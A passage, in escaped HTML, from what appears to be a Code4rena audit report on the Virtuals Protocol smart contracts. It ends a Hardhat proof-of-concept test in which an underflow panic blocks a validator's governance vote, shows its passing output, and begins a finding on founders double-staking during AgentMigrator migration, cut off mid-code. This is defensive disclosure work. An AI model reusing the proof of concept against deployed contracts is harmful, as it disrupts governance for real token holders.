class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Delegate founder\u0026#39;s votes to validator1 (founder holds a large amount of tokens)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(founder).delegate(validator1.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set up validator2 with LP tokens - similar to the validator uptime test\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const router = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify voting power\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const daoAddr = (await agentNft.virtualInfo(1)).dao;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.getContractAt(\u0026quot;AgentDAO\u0026quot;, daoAddr);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator1Votes = await veToken.getVotes(validator1.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator1 votes:\u0026quot;, formatEther(validator1Votes));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 1: Create base proposal and get it executed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId1 = await createContribution(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId (Cognitive Core)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // no dataset dependency\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Base contribution\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [validator1], // Only validator1 votes on this one\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 2: Check proposalId1\u0026#39;s maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const maturity1 = await serviceNft.getMaturity(proposalId1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Base proposal maturity:\u0026quot;, maturity1.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(maturity1).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 3: Create proposal2 (intended as an upgrade)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const descHash2 = getDescHash(\u0026quot;Improved contribution\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const mintCalldata2 = await getMintServiceCalldata(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      serviceNft,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      descHash2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.propose(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [serviceNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [0],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [mintCalldata2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Improved contribution\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Get the proposalId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentDAO.queryFilter(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agentDAO.filters.ProposalCreated,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      -1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId2 = events[events.length - 1].args[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Create contribution NFT\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await contributionNft.mint(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor2.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      TOKEN_URI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      proposalId2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0 // no datasetId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 4: Validator1 casts honest forVote with battles results\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const honestVoteParams = abi.encode(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u0026quot;uint8[] memory\u0026quot;],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [[0, 0, 0, 0, 0, 0, 1, 0, 1, 0]]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agentDAO\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .connect(validator1)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .castVoteWithReasonAndParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          proposalId2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          \u0026quot;Good improvement\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          honestVoteParams\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        )\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ).to.be.revertedWithPanic(0x11);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;validator1 vote for proposal2 reverted with 0x11 underflow panic code\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003eTest results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"108\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  RewardsV2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator1 votes: 9999999.999999999999999\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBase proposal maturity: 100\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003evalidator1 vote for proposal2 reverted with 0x11 underflow panic code\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ underflow DOS certain voting (1540ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (2s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken\" style=\"position:relative;\"\u003e\u003ca href=\"#m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken\" aria-label=\"m 22 founder has to double stake during migration with the initial lp locked in the old vetoken permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-170\"\u003e[M-22] Founder has to double-stake during migration with the initial LP locked in the old \u003ccode\u003eveToken\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-843\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-834\"\u003egkrastenov\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eDuring the migration process implemented in AgentMigrator.sol, founders face a double-staking problem where their original LP tokens remain locked in the old AgentVeToken contract while they must provide additional virtual tokens for the migration to the new system.\u003c/p\u003e\n\u003ch3 id=\"vulnerabilities-1\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerabilities-1\" aria-label=\"vulnerabilities 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerabilities\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eAgentMigrator.migrateAgent()\u003c/code\u003e function creates new token, LP, \u003ccode\u003eveToken\u003c/code\u003e, and DAO contracts but fails to provide a mechanism to migrate the founder’s locked tokens from the old \u003ccode\u003eveToken\u003c/code\u003e contract:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emigrateAgent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy Agent token \u0026amp; LP\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createNewAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eliquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_assetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddInitialLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy AgentVeToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createNewAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econcat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Staked \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econcat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;s\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 